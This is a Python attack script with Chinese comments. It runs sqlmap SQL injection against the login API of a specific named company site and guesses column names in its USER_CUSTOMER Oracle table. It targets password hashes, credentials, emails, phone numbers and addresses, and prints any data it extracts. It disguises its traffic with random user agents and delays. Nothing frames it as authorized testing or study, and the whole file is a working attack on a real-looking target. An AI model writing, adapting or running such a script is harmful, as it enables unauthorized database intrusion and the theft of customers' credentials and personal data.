#!/usr/bin/env python3
import subprocess
import time

# 常见密码列名
password_columns = [
    'PASSWD', 'USER_PASSWORD', 'ENCRYPTED_PASSWORD', 
    'PASSWORD_HASH', 'USER_PWD', 'LOGIN_PASSWORD',
    'ACCOUNT_PASSWORD', 'PASSPHRASE', 'PASS', 'PWORD',
    'USER_PASS', 'CUSTOMER_PASSWORD', 'HASHED_PASSWORD',
    'PWD_HASH', 'SECRET', 'CREDENTIAL'
]

# 其他可能的列
other_columns = [
    'EMAIL', 'PHONE', 'MOBILE', 'FULL_NAME', 'FIRST_NAME',
    'LAST_NAME', 'CUSTOMER_ID', 'USER_ID', 'CREATED_DATE',
    'LAST_LOGIN', 'STATUS', 'ROLE', 'CUSTOMER_CODE',
    'COMPANY_NAME', 'ADDRESS', 'CITY', 'COUNTRY'
]

url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
data = '{"Username":"*","Password":"test"}'

print("🔍 暴力破解 USER_CUSTOMER 列名...\n")
print("=" * 60)

found_columns = []

for col in password_columns + other_columns:
    query = f"SELECT {col} FROM USER_CUSTOMER WHERE ROWNUM<=1"
    cmd = [
        'python3', '/tmp/sqlmap-git/sqlmap.py',
        '-u', url,
        '--data', data,
        '--method', 'POST',
        '-H', 'Content-Type: application/json',
        '--dbms=Oracle',
        '--batch',
        '--random-agent',
        '--delay=2',
        '--sql-query', query
    ]
    
    print(f"[*] 测试列: {col}...", end=" ", flush=True)
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        output = result.stdout
        
        if "does not return any output" in output or "ERROR" in output:
            print("❌")
        else:
            # 检查是否有实际数据返回
            lines = output.split('\n')
            for line in lines:
                if line.strip() and not line.startswith('[') and '[*]' in line:
                    print(f"✅ 找到！")
                    found_columns.append(col)
                    # 提取数据
                    for l in lines:
                        if '[*]' in l and not 'starting @' in l and not 'ending @' in l:
                            print(f"    数据: {l.strip()}")
                    break
            else:
                print("❌")
                
    except subprocess.TimeoutExpired:
        print("⏱️ 超时")
    except Exception as e:
        print(f"⚠️ 错误: {e}")
    
    time.sleep(1)

print("\n" + "=" * 60)
print(f"✅ 发现的列: {', '.join(found_columns) if found_columns else '无'}")
